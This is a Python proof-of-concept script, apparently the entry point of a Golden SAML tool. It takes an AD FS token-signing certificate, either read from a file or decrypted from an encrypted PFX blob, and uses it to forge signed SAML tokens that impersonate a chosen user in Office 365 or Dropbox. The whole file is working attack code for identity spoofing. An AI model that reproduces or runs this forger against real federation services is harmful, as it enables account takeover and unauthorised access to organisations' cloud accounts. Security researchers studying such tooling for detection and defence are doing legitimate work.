# POC for PFX
from datetime import datetime, timedelta
from argparse import ArgumentParser
from utils import random_string, encode_object_guid
from EncryptedPfx import EncryptedPFX
from SamlSigner import SAMLSigner

DEBUG = False


def parse_args():
    arg_parser = ArgumentParser()
    key_group = arg_parser.add_mutually_exclusive_group(required=True)
    key_group.add_argument('-b', '--blob', help='Encrypted PFX blob and decryption key', nargs=2)
    key_group.add_argument('-c', '--cert', help='AD FS Signing Certificate')
    arg_parser.add_argument('-p', '--password', help='AD FS Signing Certificate Password', default=None)
    arg_parser.add_argument('-v', '--verbose', help='Verbose Output', default=False)
    arg_parser.add_argument('--assertionid', help='AssertionID string. Defaults to a random string', default=random_string())
    arg_parser.add_argument('--responseid', help='The Response ID. Defaults to random string', default=random_string())
    arg_parser.add_argument('-s', '--server', help='name of adfs server. e.g. sts.example.com DO NOT include HTTPS://', required=True)

    subparsers = arg_parser.add_subparsers(
        title='modules',
        description='loaded modules',
        help='additional help',
        dest='command'
    )

    parser_office365 = subparsers.add_parser('o365')
    parser_office365.add_argument('--upn', help='Universal Principal Name of user to spoof', required=True)
    parser_office365.add_argument('--objectguid', help='Object GUID of user to spoof. You can get this from AD', required=True),

    parser_dropbox = subparsers.add_parser('dropbox')
    parser_dropbox.add_argument('--email', help='User email address', required=True)
    parser_dropbox.add_argument('--accountname', help='SAM Account Name', required=True)

    args = arg_parser.parse_args()
    if args.verbose:
        global DEBUG
        DEBUG = True

    return args


def get_signer(args):
    if args.cert:
        password = bytes(args.password, 'utf-8')
        with open(args.cert, 'rb') as infile:
            pfx = infile.read()
        signer = SAMLSigner(pfx, args.command, password=password)
    else:
        pfx = EncryptedPFX(args.blob[0], args.blob[1])
        decrypted_pfx = pfx.decrypt_pfx()
        signer = SAMLSigner(decrypted_pfx, args.command)

    return signer


def get_module_params(command):
    now = datetime.utcnow()
    hour = timedelta(hours=1)
    five_minutes = timedelta(minutes=5)
    second = timedelta(seconds=1)
    token_created = (now).strftime('%Y-%m-%dT%H:%M:%S.000Z')
    token_expires = (now + hour).strftime('%Y-%m-%dT%H:%M:%S.000Z')
    subject_confirmation_time = (now + five_minutes).strftime('%Y-%m-%dT%H:%M:%S.000Z')
    authn_instant = (now - second).strftime('%Y-%m-%dT%H:%M:%S.500Z')

    if command == 'o365':
        immutable_id = encode_object_guid(args.objectguid).decode('ascii')

        params = {
            'TokenCreated': token_created,
            'TokenExpires': token_expires,
            'UPN': args.upn,
            'NameIdentifier': immutable_id,
            'AssertionID': args.assertionid,
            'AdfsServer': args.server
        }
        name_identifier = "AssertionID"

    elif command == 'dropbox':
        params = {
            'TokenCreated': token_created,
            'TokenExpires': token_expires,
            'EmailAddress': args.email,
            'SamAccountName': args.accountname,
            'AssertionID': args.assertionid,
            'AdfsServer': args.server,
            'SubjectConfirmationTime': subject_confirmation_time,
            'ResponseID': args.responseid,
            'AuthnInstant': authn_instant
        }
        name_identifier = "ID"

    return params, name_identifier


if __name__ == "__main__":

    args = parse_args()

    signer = get_signer(args)

    params, id_attribute = get_module_params(args.command)

    token = signer.sign_XML(params, id_attribute)

    print(token)
